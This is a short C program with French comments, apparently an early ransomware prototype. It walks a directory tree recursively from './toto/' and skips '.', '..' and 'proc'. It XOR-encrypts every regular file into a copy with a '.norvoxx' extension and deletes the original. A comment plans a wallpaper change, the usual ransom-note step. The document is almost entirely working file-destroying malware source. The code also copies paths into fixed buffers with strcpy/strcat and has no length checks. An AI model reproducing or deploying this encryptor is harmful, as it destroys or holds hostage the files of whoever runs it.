#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// ajouter des verification de permision de utilisation de stat pour plus de portabiliter
// changer fond ecrant linux commande
void fichier_cryp(char *path,int key){
    char new[255];
    strcpy(new,path);
    strcat(new,".norvoxx");

    FILE *fichier_in = fopen(path,"rb");
    FILE *fichier_cry = fopen(new,"wb");

    if (fichier_in == NULL || fichier_cry == NULL)
        return;

    int buffer;
    while (fread(&buffer, sizeof(int), 1, fichier_in) == 1){
        buffer ^= key;
        fwrite(&buffer , sizeof(int),1,fichier_cry);
        //printf("%d",buffer);
    }
    fclose(fichier_in);
    fclose(fichier_cry);
    remove(path);
}
void fichier_liste(char *path){
    DIR *rep = opendir(path);
    if (rep == NULL)
        return ;
    struct dirent *file;
    while ((file = readdir(rep)) != NULL)
    {
        if (file->d_type == 8){
            char full_path[255];
            strcpy(full_path,path);
            strcat(full_path,file->d_name);
            
            fichier_cryp(full_path,131269);
        }
        if (file->d_type == 4)
        {
            char new_path[2064];
            if (strcmp("..",file->d_name) != 0 && strcmp(".",file->d_name) != 0 && strcmp("proc",file->d_name) != 0)
            {
                strcpy(new_path,path);
                strcat(strcat(new_path,file->d_name),"/");
                fichier_liste(new_path);
            }
        }
    }
}
int main(int argc, char const *argv[])
{
    /* code */
    fichier_liste("./toto/");
    //fichier_cryp("toto.txt","toto",123121312);
    return 0;
}